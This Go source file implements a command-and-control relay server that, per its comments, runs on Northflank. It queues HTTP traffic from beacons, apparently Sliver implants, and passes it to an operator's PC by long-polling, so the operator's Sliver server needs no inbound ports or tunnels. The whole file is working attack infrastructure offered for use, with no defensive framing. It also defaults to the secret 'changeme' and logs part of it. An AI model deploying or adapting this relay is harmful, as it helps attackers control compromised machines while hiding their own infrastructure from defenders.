// C2 relay server — runs on Northflank (512MB, single container).
//
// How it works:
// 1. Beacon sends HTTP to this server (any path)
// 2. Server queues the request and blocks the beacon's connection
// 3. Your PC long-polls GET /relay/poll — receives the beacon's request
// 4. Your PC forwards it to local Sliver, gets response
// 5. Your PC POSTs the response to /relay/respond/{id}
// 6. Server unblocks the beacon connection and returns the response
//
// No tunnels, no chisel, no inbound ports on your PC.
package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

type pending struct {
	id      uint64
	method  string
	path    string
	headers http.Header
	body    []byte
	respCh  chan *response
	created time.Time
}

type response struct {
	status  int
	headers http.Header
	body    []byte
}

var (
	mu      sync.Mutex
	queue   []*pending
	waiting map[uint64]*pending
	nextID  atomic.Uint64
	secret  string
)

func init() {
	waiting = make(map[uint64]*pending)
}

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	secret = os.Getenv("RELAY_SECRET")
	if secret == "" {
		secret = "changeme"
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/relay/poll", handlePoll)
	mux.HandleFunc("/relay/respond/", handleRespond)
	mux.HandleFunc("/health", func(w http.ResponseWriter, _ *http.Request) { w.Write([]byte("ok")) })
	mux.HandleFunc("/", handleBeacon)

	log.Printf("relay server on :%s (secret=%s...)", port, secret[:4])
	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%s", port), mux))
}

// handleBeacon — any path not /relay/* is beacon traffic
func handleBeacon(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	id := nextID.Add(1)

	p := &pending{
		id:      id,
		method:  r.Method,
		path:    r.URL.RequestURI(),
		headers: r.Header.Clone(),
		body:    body,
		respCh:  make(chan *response, 1),
		created: time.Now(),
	}

	mu.Lock()
	queue = append(queue, p)
	waiting[id] = p
	mu.Unlock()

	log.Printf("[%d] beacon %s %s (%d bytes) — queued", id, r.Method, r.URL.Path, len(body))

	select {
	case resp := <-p.respCh:
		for k, vs := range resp.headers {
			for _, v := range vs {
				w.Header().Add(k, v)
			}
		}
		w.WriteHeader(resp.status)
		w.Write(resp.body)
		log.Printf("[%d] beacon <- %d (%d bytes)", id, resp.status, len(resp.body))
	case <-time.After(120 * time.Second):
		mu.Lock()
		delete(waiting, id)
		mu.Unlock()
		http.Error(w, "timeout", 504)
		log.Printf("[%d] beacon timeout", id)
	}
}

// handlePoll — client long-polls for the next beacon request
func handlePoll(w http.ResponseWriter, r *http.Request) {
	if r.Header.Get("X-Secret") != secret {
		http.Error(w, "unauthorized", 401)
		return
	}

	// Wait up to 30s for a request to arrive
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		mu.Lock()
		// Clean stale entries
		now := time.Now()
		fresh := queue[:0]
		for _, p := range queue {
			if now.Sub(p.created) < 110*time.Second {
				fresh = append(fresh, p)
			}
		}
		queue = fresh

		if len(queue) > 0 {
			p := queue[0]
			queue = queue[1:]
			mu.Unlock()

			w.Header().Set("X-Relay-Id", strconv.FormatUint(p.id, 10))
			w.Header().Set("X-Relay-Method", p.method)
			w.Header().Set("X-Relay-Path", p.path)
			for k, vs := range p.headers {
				for _, v := range vs {
					w.Header().Add("X-Orig-"+k, v)
				}
			}
			w.WriteHeader(200)
			w.Write(p.body)
			log.Printf("[%d] -> client %s %s", p.id, p.method, p.path)
			return
		}
		mu.Unlock()
		time.Sleep(500 * time.Millisecond)
	}

	// No requests within 30s — return empty
	w.Header().Set("Content-Type", "text/plain")
	w.WriteHeader(204)
}

// handleRespond — client sends the Sliver response back
func handleRespond(w http.ResponseWriter, r *http.Request) {
	if r.Header.Get("X-Secret") != secret {
		http.Error(w, "unauthorized", 401)
		return
	}

	idStr := r.URL.Path[len("/relay/respond/"):]
	id, err := strconv.ParseUint(idStr, 10, 64)
	if err != nil {
		http.Error(w, "bad id", 400)
		return
	}

	body, _ := io.ReadAll(r.Body)
	status, _ := strconv.Atoi(r.Header.Get("X-Relay-Status"))
	if status == 0 {
		status = 200
	}

	// Forward original headers
	respHeaders := make(http.Header)
	for k, vs := range r.Header {
		if len(k) > 7 && k[:7] == "X-Orig-" {
			for _, v := range vs {
				respHeaders.Add(k[7:], v)
			}
		}
	}

	mu.Lock()
	p, ok := waiting[id]
	if ok {
		delete(waiting, id)
	}
	mu.Unlock()

	if !ok {
		http.Error(w, "request expired", 404)
		return
	}

	p.respCh <- &response{status: status, headers: respHeaders, body: body}
	log.Printf("[%d] <- client %d (%d bytes)", id, status, len(body))
	w.Write([]byte("ok"))
}
